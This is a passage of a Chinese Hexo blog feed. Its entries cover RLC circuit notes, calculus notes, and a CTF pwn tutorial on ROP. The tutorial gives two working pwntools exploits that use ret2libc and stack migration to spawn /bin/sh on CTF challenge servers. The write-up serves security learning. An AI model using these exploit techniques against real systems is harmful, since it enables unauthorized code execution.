title="RLC并联电路的零输入响应"></a>RLC并联电路的零输入响应</h2><p>$$<br>LC\frac{d^2i_L}{dt^2}+GL\frac{di_L}{dt}+i_L&#x3D;i_s(t)<br>$$</p><p>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}<br>$$</p><p>$$<br>s_{1,2}&#x3D;-\frac{G}{2C}\pm\sqrt{(\frac{G}{2C})^2-\frac{1}{LC}}&#x3D;-\alpha\pm j\sqrt{w_0^2-\alpha^2}&#x3D;-\alpha\pm jw_d<br>$$</p><p>衰减因子$\alpha&#x3D;\frac{G}{2C}$，因为RCL并联电路震荡快慢由u决定，故用电容时间常数，等于$\frac{1}{2\tau}$</p><p>无阻尼自然（谐振）频率$w_0&#x3D;\frac{1}{\sqrt{LC}}$</p><p>有阻尼自然频率$w_d&#x3D;\sqrt{w_0^2-\alpha^2}$</p>]]></content>
      
      
      <categories>
          
          <category> ESE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电路分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN从入门到出入平安（二）——ROP</title>
      <link href="/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94ROP/"/>
      <url>/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h1><p>Linux下的ASLR总共有3个级别，0、1、2</p><ul><li>0就是关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同。</li><li>1是普通的ASLR。mmap基地址、栈基地址、.so加载基地址都将被随机化，但是堆没用随机化</li></ul><p>2是增强的ASLR，增加了堆随机化</p><h2 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h2><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>rdi，rsi， rdx， rcx， r8， r9</p><p>参数为7个以上，后面以此从右往左放入栈中</p><h2 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">read()：</span><br><span class="line">  <span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span> *buf,<span class="type">size_t</span> nbytes)</span>; </span><br><span class="line">  <span class="comment">//fd 为要读取的文件的描述符  0</span></span><br><span class="line">  <span class="comment">//buf 为要读取的数据的缓冲区地址 </span></span><br><span class="line">  <span class="comment">//nbytes 为要读取的数据的字节数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//read() 函数会从 fd 文件中读取 nbytes 个字节并保存到缓冲区 buf，</span></span><br><span class="line"> <span class="comment">//成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。</span></span><br><span class="line"></span><br><span class="line">write() </span><br><span class="line">  <span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span> *buf,<span class="type">size_t</span> nbytes)</span>;</span><br><span class="line">  <span class="comment">//fd 为要写入的文件的描述符  1 </span></span><br><span class="line">  <span class="comment">//buf 为要写入的数据的缓冲区地址</span></span><br><span class="line">  <span class="comment">//nbytes 为要写入的数据的字节数 </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//write() 函数会将缓冲区 buf 中的 nbytes 个字节写入文件 fd，</span></span><br><span class="line"> <span class="comment">//成功则返回写入的字节数，失败则返回 -1。</span></span><br><span class="line"><span class="built_in">printf</span>一直输出到\x00</span><br></pre></td></tr></table></figure><h2 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h2><ul><li>read&#x2F;rewrite register&#x2F;memory<ul><li><code>pop eaxret</code></li><li><code>mov [eax],ebxret</code></li></ul></li><li>system call</li><li>change esp</li></ul><h3 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h3><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h4 id="X86"><a href="#X86" class="headerlink" title="X86"></a>X86</h4><p><strong>调用方式：</strong><code>int 0x80</code> 中断进行系统调用</p><p><strong>传参方式：</strong>首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</p><p><strong>调用号：</strong><code>sys_read</code> 的调用号 为 3，<code>sys_write</code> 的调用号 为 4，<code>sys_execve</code>的调用号为11*(0xB)*</p><h4 id="amd"><a href="#amd" class="headerlink" title="amd"></a>amd</h4><p><strong>调用方式：</strong><code>syscall</code>进行系统调用</p><p><strong>传参方式：</strong>首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</p><p><strong>调用号：</strong><code>sys_read</code> 的调用号 为 0， <code>sys_write</code> 的调用号 为 1，<code>stub_execve</code> 的调用号 为 59*(0x3B)*，<code>stub_rt_sigreturn</code>的调用号 为 15</p><p><code>execve</code>函数作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p><p><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>可分两次写入<code>/bin</code>和<code>/sh\x00</code></p><p>​</p><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn4&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">28240</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">rdi_ret=<span class="number">0x00000000004007d3</span></span><br><span class="line">ret=<span class="number">0x0000000000400556</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x68</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(rdi_ret)     </span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;_start&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))    </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x68</span>*<span class="string">b&#x27;\x00&#x27;</span> + p64(rdi_ret)+p64(binsh)+p64(ret)+p64(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="got-hijacking"><a href="#got-hijacking" class="headerlink" title="got hijacking"></a>got hijacking</h1><p>把got表地址覆盖为目标函数的地址</p><h1 id="stack-migration"><a href="#stack-migration" class="headerlink" title="stack migration"></a>stack migration</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>call func:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push eip+4</span><br><span class="line">push ebp</span><br><span class="line">mov ebp esp</span><br></pre></td></tr></table></figure><p><strong>leave:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure><p><strong>ret:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure><h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">28566</span></span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_es_2&quot;)</span></span><br><span class="line">p = remote(host,  port)</span><br><span class="line">elf =ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line"></span><br><span class="line">hack_addr = <span class="number">0x0804854B</span></span><br><span class="line">leave_ret_addr = <span class="number">0x080484b8</span></span><br><span class="line">echoflag_addr = <span class="number">0x080486c0</span></span><br><span class="line">vul_addr = <span class="number">0x08048595</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">pl = cyclic(<span class="number">39</span>)</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">ebp = u32(p.recvn(<span class="number">4</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line">pl = flat([<span class="string">b&quot;aaaa&quot;</span>,sys_addr, <span class="string">b&quot;bbbb&quot;</span>,ebp-<span class="number">0x28</span>+<span class="number">16</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>])</span><br><span class="line">pl += cyclic(<span class="number">16</span>)</span><br><span class="line">pl += flat([ebp-<span class="number">0x28</span>, leave_ret_addr])</span><br><span class="line">p.send(pl)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这里解释一下，为什么会有4个字节空余的部分。<br>这里的部分，在正常调用system函数的时候，堆栈位置的system_plt之后的内容为system函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在system_plt和sh_addr之间增加了4个字符来进行填充。</p></blockquote><h2 id="其他gadgets"><a href="#其他gadgets" class="headerlink" title="其他gadgets"></a>其他gadgets</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add esp,0xNN;ret</span><br><span class="line">sub esp,0xNN;ret</span><br><span class="line">ret 0xNN</span><br><span class="line">xchg esp,exx;ret</span><br><span class="line">partial overwrite ebp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MK_Caculus</title>
      <link href="/MK-Caculus/"/>
      <url>/MK-Caculus/</url>
      
        <content type="html"><![CDATA[<h1 id="函数基础"><a href="#函数基础" class="headerlink" title="函数基础"></a>函数基础</h1><h2 id="双曲函数"><a href="#双曲函数" class="headerlink" title="双曲函数"></a>双曲函数</h2><p>$$ 双曲正弦函数\space y&#x3D;sh \space x &#x3D;\frac{e^x-e^{-x}}{2} $$</p><p>$$ 双曲余弦函数\space y&#x3D;ch \space x &#x3D;\frac{e^x+e^{-x}}{2} $$</p><p>$$ 双曲正切函数\space y&#x3D;th \space x&#x3D;\frac{sh\space x}{ch\space x} &#x3D;\frac{e^x-e^{-x}}{e^x+e^{-x}} $$</p><h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><p>$$ secA&#x3D;\frac{1}{cosA} $$</p><p>$$ cscA&#x3D;\frac{1}{sinA} $$</p><hr><h1 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h1><h2 id="数列极限"><a href="#数列极限" class="headerlink" title="数列极限"></a>数列极限</h2><p>$$ \forall \varepsilon&gt;0,\exists N&gt;0,s.t.|x_n-A|&lt;\varepsilon,when\space n&gt;N $$</p><h2 id="自变量趋于无穷大时函数极限"><a href="#自变量趋于无穷大时函数极限" class="headerlink" title="自变量趋于无穷大时函数极限"></a>自变量趋于无穷大时函数极限</h2><p>$$ \forall \varepsilon &gt;0,\exist X&gt;0,s.t.|f(x)-A|&lt;\varepsilon,when \  \ x&gt;X&#x2F;x&lt;X&#x2F;|x|&gt;X $$</p><h2 id="自变量趋近有限值时函数极限"><a href="#自变量趋近有限值时函数极限" class="headerlink" title="自变量趋近有限值时函数极限"></a>自变量趋近有限值时函数极限</h2><p>$$ \forall \varepsilon&gt;0,\exist \delta&gt;0,s.t.|f(x)-A|&lt;\varepsilon,when \ \ 0&lt;|x-x_0|&lt;\delta $$</p><h2 id="单侧极限：dddd"><a href="#单侧极限：dddd" class="headerlink" title="单侧极限：dddd"></a>单侧极限：dddd</h2><h2 id="数列极限与函数极限的关系"><a href="#数列极限与函数极限的关系" class="headerlink" title="数列极限与函数极限的关系"></a>数列极限与函数极限的关系</h2><h3 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h3><p>$$ 设f(x)在x_0某个去心领域\mathring{U}(x_0)内有定义，则\ \ \lim_{n \to \infty}f(x)&#x3D;A \Longleftrightarrow \forall {x_n}满足(1)\ \ x_n\in \mathring{U}(x_0);(2)\ \ \lim_{x\to\infty}x_n&#x3D;x_0,\ \ \lim_{n \to \infty}f(x_n)&#x3D;A $$</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>证明函数极限不存在</p><ol><li>找收敛于$x_0$的数列${x_n}$，但$f(x_n)$极限不存在</li><li>找两个收敛于的数列，但函数极限不同</li></ol><h2 id="夹逼准则"><a href="#夹逼准则" class="headerlink" title="夹逼准则"></a>夹逼准则</h2><h2 id="单调有界准则"><a href="#单调有界准则" class="headerlink" title="单调有界准则"></a>单调有界准则</h2><hr><h1 id="无穷"><a href="#无穷" class="headerlink" title="无穷"></a>无穷</h1><h2 id="无穷小"><a href="#无穷小" class="headerlink" title="无穷小"></a>无穷小</h2><p>$$ \forall\varepsilon&gt;0,\exist \delta&gt;0,s.t.|f(x)|&lt;\varepsilon ,when \ \ 0&lt;|x-x_0|&lt;\delta $$</p><h2 id="无穷大"><a href="#无穷大" class="headerlink" title="无穷大"></a>无穷大</h2><p>$$ \forall M&gt;0,\exist \delta&gt;0,s.t.|f(x)|&gt;M,when \ \ 0&lt;|x-x_0|&lt;\delta $$</p><h2 id="定理-1"><a href="#定理-1" class="headerlink" title="定理"></a>定理</h2><p>无穷小与有界变量之积为无穷小</p><h2 id="重要极限"><a href="#重要极限" class="headerlink" title="重要极限"></a>重要极限</h2><p>$$ \lim_{x\to\infty}(1+\frac{1}{x})^x&#x3D;e $$</p><h2 id="等价无穷小"><a href="#等价无穷小" class="headerlink" title="等价无穷小"></a>等价无穷小</h2><hr><h1 id="一元函数积分学"><a href="#一元函数积分学" class="headerlink" title="一元函数积分学"></a>一元函数积分学</h1><h2 id="函数可积的充分条件"><a href="#函数可积的充分条件" class="headerlink" title="函数可积的充分条件"></a>函数可积的充分条件</h2><p>$$ f(x)在[a,b]上连续 \Longrightarrow f(x)在[a,b]上可积\Longleftarrow f(x)在[a,b]上有界，且只有有限个第一类间断点 $$</p><h2 id="定理-2"><a href="#定理-2" class="headerlink" title="定理"></a>定理</h2><h3 id="估值定理"><a href="#估值定理" class="headerlink" title="估值定理"></a>估值定理</h3><p>$$ M,m是f(x)区间[a,b]上最大值和最小值，则 $$</p><p>$$ m(b-a)\leq \int^b_af(x)dx\leq M(b-a),(a&lt;b) $$</p><h3 id="积分中值定理"><a href="#积分中值定理" class="headerlink" title="积分中值定理"></a>积分中值定理</h3><p>$$ 设f(x)\in C[a,b],则至少存在一点\xi \in(a,b)，使得 $$</p><p>$$ \int^b_af(x)dx&#x3D;f(\xi)(b-a) $$</p><h2 id="积分上限函数"><a href="#积分上限函数" class="headerlink" title="积分上限函数"></a>积分上限函数</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>$$ \Phi(x)&#x3D;\int^x_af(t)dt\ \ \ \ (a\leq x\leq b) $$</p><h3 id="定理-3"><a href="#定理-3" class="headerlink" title="定理"></a>定理</h3><p>$$ f(x)\in C[a,b],则\Phi’(x)&#x3D;f(x) $$</p><p>$$ f(x)\in C[a,b]，则f(x)在[a,b]上必有原函数 $$</p><h2 id="微积分基本定理"><a href="#微积分基本定理" class="headerlink" title="微积分基本定理"></a>微积分基本定理</h2><h2 id="不定积分"><a href="#不定积分" class="headerlink" title="不定积分"></a>不定积分</h2><h2 id="反常积分"><a href="#反常积分" class="headerlink" title="反常积分"></a>反常积分</h2><h3 id="无穷区间"><a href="#无穷区间" class="headerlink" title="无穷区间"></a>无穷区间</h3><h3 id="无界"><a href="#无界" class="headerlink" title="无界"></a>无界</h3><h2 id="几何应用"><a href="#几何应用" class="headerlink" title="几何应用"></a>几何应用</h2><h3 id="极坐标下求面积"><a href="#极坐标下求面积" class="headerlink" title="极坐标下求面积"></a>极坐标下求面积</h3><p>扇形面积微元：</p><p>$$ dA&#x3D;\frac{1}{2}r^2(\theta)d\theta $$</p><hr><h1 id="一元函数微分学"><a href="#一元函数微分学" class="headerlink" title="一元函数微分学"></a>一元函数微分学</h1><h2 id="导数"><a href="#导数" class="headerlink" title="导数"></a>导数</h2><p>$$ 函数在某点可导\implies 函数在某点连续 $$</p><p>$$ 函数在某点可导\nLeftarrow 函数在某点连续 $$</p><h3 id="反函数求导"><a href="#反函数求导" class="headerlink" title="反函数求导"></a>反函数求导</h3><p>$$ (f^{-1})’(x)&#x3D;\frac{1}{f’(y)} $$</p><h3 id="参数式函数、反函数二阶求导"><a href="#参数式函数、反函数二阶求导" class="headerlink" title="参数式函数、反函数二阶求导"></a>参数式函数、反函数二阶求导</h3><h2 id="隐函数求导"><a href="#隐函数求导" class="headerlink" title="隐函数求导"></a>隐函数求导</h2><h3 id="对数求导法"><a href="#对数求导法" class="headerlink" title="对数求导法"></a>对数求导法</h3><h2 id="参数式函数求导"><a href="#参数式函数求导" class="headerlink" title="参数式函数求导"></a>参数式函数求导</h2><h2 id="高阶导数"><a href="#高阶导数" class="headerlink" title="高阶导数"></a>高阶导数</h2><p>$$ (sinx)^{(n)}&#x3D;sin(x+\frac{\pi}{2}n) $$</p><p>$$ (cosx)^{(n)}&#x3D;cos(x+\frac{\pi}{2}n) $$</p><p>$$ [\alpha u(x)+\beta v(x)]^{(n)}&#x3D;\alpha u^{(n) }(x)+\beta v^{(n)}(x) $$</p><p>莱布尼兹公式：</p><p>$$ (uv)^{(n)}&#x3D;\sum^{n}_{k&#x3D;0}C^k_nu^{(n-k)}v^{(k)} $$</p><h2 id="微分"><a href="#微分" class="headerlink" title="微分"></a>微分</h2><p>$$ \Delta y&#x3D;A\Delta x+o(\Delta x) $$</p><p>$$ 可导\iff 可微 $$</p><p>$$ \frac{dy}{dx}&#x3D;f’(x) $$</p><h3 id="线性近似"><a href="#线性近似" class="headerlink" title="线性近似"></a>线性近似</h3><p>$$ f(x) \approx f(x_0)+f’(x_0)(x-x_0) $$</p><h2 id="微分中值定理"><a href="#微分中值定理" class="headerlink" title="微分中值定理"></a>微分中值定理</h2><h3 id="罗尔中值定理"><a href="#罗尔中值定理" class="headerlink" title="罗尔中值定理"></a>罗尔中值定理</h3><h3 id="拉格朗日中值定理"><a href="#拉格朗日中值定理" class="headerlink" title="拉格朗日中值定理"></a>拉格朗日中值定理</h3><h3 id="柯西中值定理"><a href="#柯西中值定理" class="headerlink" title="柯西中值定理"></a>柯西中值定理</h3><h2 id="泰勒公式"><a href="#泰勒公式" class="headerlink" title="泰勒公式"></a>泰勒公式</h2><h2 id="曲率"><a href="#曲率" class="headerlink" title="曲率"></a>曲率</h2><h3 id="弧微分公式"><a href="#弧微分公式" class="headerlink" title="弧微分公式"></a>弧微分公式</h3><p>$$ ds&#x3D;\sqrt{1+y’^{2}}dx $$</p><h2 id="曲率-1"><a href="#曲率-1" class="headerlink" title="曲率"></a>曲率</h2><p>$$ K&#x3D;\lim_{\Delta s\to 0}|\frac{\Delta \alpha }{\Delta s}|&#x3D;|\frac{d\alpha }{ds}| $$</p><h3 id="曲率计算公式"><a href="#曲率计算公式" class="headerlink" title="曲率计算公式"></a>曲率计算公式</h3><p>懒得写了</p><hr><h1 id="一元函数积分学-1"><a href="#一元函数积分学-1" class="headerlink" title="一元函数积分学"></a>一元函数积分学</h1><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><p>$$<br> \int \sec^2x\mathrm{d}x&#x3D;\tan x+C \\<br> \int \csc^2x\mathrm{d}x&#x3D;-\cot x+C \\<br> \int \sec x\tan x \mathrm{d}x &#x3D;\sec x+C \\<br> \int \csc x\cot x\mathrm{d}x&#x3D;-\csc x+C \\<br> \int \frac{1}{\sqrt{1-x^2}}\mathrm{d}x&#x3D;\arcsin x+C \\<br> \int \frac{1}{1+x^2}\mathrm{d}x&#x3D;\arctan x+C \\<br>$$</p><p>$$<br>\int \tan x\mathrm{d}x&#x3D;-\ln\lvert \cos x\rvert +C\\<br> \int \cot x\mathrm{d}x&#x3D;\ln\lvert\sin x\rvert +C\\<br> \int \sec x\mathrm{d}x&#x3D;\ln \lvert \sec x+\tan x\rvert +C\\<br> \int \csc x\mathrm{d}x&#x3D;\ln\lvert \csc x- \cot x\rvert +C\\<br> \int \frac{1}{a^2-x^2}\mathrm{d}x&#x3D;\frac{1}{2a}\ln\lvert\frac{a+x}{a-x}\rvert +C\\<br> \int \frac{1}{\sqrt{x^2\pm a^2}}\mathrm{d}x&#x3D;\ln\lvert x+ \sqrt{x^2\pm a^2}\rvert +C\\\\<br>$$</p><p>$$<br>\int ^{\frac{\pi}{2}}_0f(\sin x)\mathrm{d}x&#x3D;\int ^{\frac{\pi}{2}}_0f(\cos x)\mathrm{d}x\\<br> \int ^{\pi}_0xf(\sin x)\mathrm{d}x&#x3D;\frac{\pi}{2}\int ^{\pi}_0f(\sin x)\mathrm{d}x\\<br> \int ^{\pi}_0f(\sin x)\mathrm{d}x&#x3D;2\int ^{\frac{\pi}{2}}_0f(\sin x)\mathrm{d}x<br>$$</p><h1 id="常微分方程"><a href="#常微分方程" class="headerlink" title="常微分方程"></a>常微分方程</h1><p>常微分方程：未知函数一元</p><p>偏微分方程：未知函数二元及以上</p><h2 id="一阶微分方程-First-Order-Differential-Equations"><a href="#一阶微分方程-First-Order-Differential-Equations" class="headerlink" title="一阶微分方程(First-Order Differential Equations)"></a>一阶微分方程(First-Order Differential Equations)</h2><h3 id="齐次方程"><a href="#齐次方程" class="headerlink" title="齐次方程"></a>齐次方程</h3><p>$$<br> \frac{dy}{dx}&#x3D;\varphi (\frac{y}{x})<br>$$</p><p>$$ 令u&#x3D;\frac{y}{x},\space u+x\frac{du}{dx}&#x3D;\varphi(u) $$</p><h3 id="一阶线性方程"><a href="#一阶线性方程" class="headerlink" title="一阶线性方程"></a>一阶线性方程</h3><p>$$<br>\frac{dy}{dx}+P(x)y&#x3D;Q(x)\\<br> y&#x3D;\frac{1}{v(x)} \int v(x)Q(x)dx,\space v&#x3D;e^{\int P(x)dx}<br>$$</p><h3 id="伯努利-Bernoulli-方程"><a href="#伯努利-Bernoulli-方程" class="headerlink" title="伯努利(Bernoulli)方程"></a>伯努利(Bernoulli)方程</h3><p>$$<br>\frac{dy}{dx}+P(x)y&#x3D;Q(x)y^n ,\space(n \neq 0,1)\\<br> y^{-n}\frac{dy}{dx}+P(x)y^{1-n}&#x3D;Q(x)<br>$$</p><p>$$ 令z&#x3D;y^{1-n},\space \frac {dz}{dx}&#x3D;(1-n)y^{-n} \frac{dy}{dx} $$</p><p>$$ 将y代回原方程,\space \frac{dz}{dx}+(1-n)P(x)z&#x3D;(1-n)Q(x) $$</p><h2 id="可降价的高阶微分方程"><a href="#可降价的高阶微分方程" class="headerlink" title="可降价的高阶微分方程"></a>可降价的高阶微分方程</h2><ol><li><p>$y^{(n)}&#x3D;f(x)$</p></li><li><p>$y’’&#x3D;f(x,y’)$</p></li><li><p>$y’’&#x3D;f(y,y’)$</p><p>令$p&#x3D;y’$</p></li></ol><h2 id="二阶齐次线性方程"><a href="#二阶齐次线性方程" class="headerlink" title="二阶齐次线性方程"></a>二阶齐次线性方程</h2><p>$$<br>\frac{d^2y}{dx^2}+P(x)\frac{dy}{dx}+Q(x)y&#x3D;0<br>$$</p><h3 id="线性微分算子"><a href="#线性微分算子" class="headerlink" title="线性微分算子"></a>线性微分算子</h3><p>$$<br>L(C_1 y_1+C_2y_2)&#x3D;C_1L(y_1)+C_2L(y_2)<br>$$</p><p>定理1：二阶齐次线性方程的两个解的线性组合仍是该方程的解</p><p>定理2：设$y_1(x),y_2(x)$均不为零，则线性相关$\Leftrightarrow $两函数之比恒等于一个常熟，反之不恒等</p><p>定理3： 两个线性无关特解的线性组合为通解</p><h3 id="二阶常系数齐次线性方程"><a href="#二阶常系数齐次线性方程" class="headerlink" title="二阶常系数齐次线性方程"></a>二阶常系数齐次线性方程</h3><p>$$<br> y’’+py’+qy&#x3D;0<br>$$</p><p>$$ 欧拉待定指数函数法：设方程有解y&#x3D;e^{rx},代入得:r^2+pr+q&#x3D;0（特征方程） $$</p><ol><li>$\Delta&gt;0$</li><li>$\Delta&#x3D;0$</li></ol><p>$$ 需找出另一解，设\frac{y_2}{y_1}&#x3D;u(x)不为常数 $$</p><p>$$ y_2&#x3D;e^{r_1x}u(x)，求导两次 $$</p><p>$$ 代入微分方程，整理,一通操作：y_2&#x3D;xe^{r_1x} $$</p><ol><li>$\Delta&lt;0$</li></ol><p>$$<br>r&#x3D;\alpha \pm i\beta\\<br> y&#x3D;e^{\alpha x}(C_1\cos\beta x+C_2\sin \beta x)<br>$$</p><h3 id="二阶非齐次线性方程"><a href="#二阶非齐次线性方程" class="headerlink" title="二阶非齐次线性方程"></a>二阶非齐次线性方程</h3><h1 id="多元函数积分学"><a href="#多元函数积分学" class="headerlink" title="多元函数积分学"></a>多元函数积分学</h1><h2 id="数量值函数"><a href="#数量值函数" class="headerlink" title="数量值函数"></a>数量值函数</h2><h3 id="二重"><a href="#二重" class="headerlink" title="二重"></a>二重</h3><h3 id="三重"><a href="#三重" class="headerlink" title="三重"></a>三重</h3><h3 id="第一类曲线"><a href="#第一类曲线" class="headerlink" 